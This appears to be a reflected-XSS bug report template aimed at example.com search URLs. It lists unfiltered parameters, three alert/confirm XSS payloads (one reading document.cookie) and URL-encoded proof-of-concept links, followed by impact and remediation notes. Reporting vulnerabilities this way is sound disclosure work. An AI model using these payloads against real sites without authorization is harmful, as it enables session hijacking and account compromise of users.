# RXSS -Report Template
# SKidrow|Twitter:@firfox20 

################################################
**->  Scope = {

https://example.com/search/executeSearch?sp-q=FUZZ&sp-p=FUZZ&pag-start=FUZZ&sp-c=FUZZ&sp-m=FUZZ&sp-s=FUZZ  
https://example.comsearch/site?page=FUZZ  

}
################################################
**->  Reflected XSS Summary = { 

arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way
################################################
}
Reflected Parmaters = { 
Param: sp-q Unfiltered
Param: sp-p Unfiltered
Param: pag-start Unfiltered
Param: sp-c Unfiltered
Param: sp-m Unfiltered
Param: sp-s Unfiltered
Param: page Unfiltered
}

################################################
**->  Used RXSS Payloads = { 


"><img src=x onerror=alert(document.domain)>//
"><svg onload=confirm(1)>
"><img src=x onerror=alert(document.cookie)>//
}
################################################
**->  Steps to Reproduce = {

# - > Open below Urls Contains the Payloads [ And Watch Alert Popup }

}
################################################
**->  Full LInks of RXSS = { 
#1 - >RXSS
https://example.com/search/executeSearch?sp-q=%22%3E%3Csvg%20onload=confirm(1)%3E&sp-p=%22%3E%3Csvg%20onload=confirm(1)%3E&pag-start=%22%3E%3Csvg%20onload=confirm(1)%3E&sp-c=%22%3E%3Csvg%20onload=confirm(1)%3E&sp-m=%22%3E%3Csvg%20onload=confirm(1)%3E&sp-s=%22%3E%3Csvg%20onload=confirm(1)%3E

#2 - > RXSS 

https://example.com/search/site?page=%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E//

}
################################################
**-> Impact of reflected XSS attacks = {
Perform any action within the application that the user can perform.
View any information that the user is able to view.
modify any information that the user is able to modify.
nitiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user
########################################
**->PoC

{Attached}
########################################
**->Remediation

encode special characters like `'` `"` `<` `>`
## See also
https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)
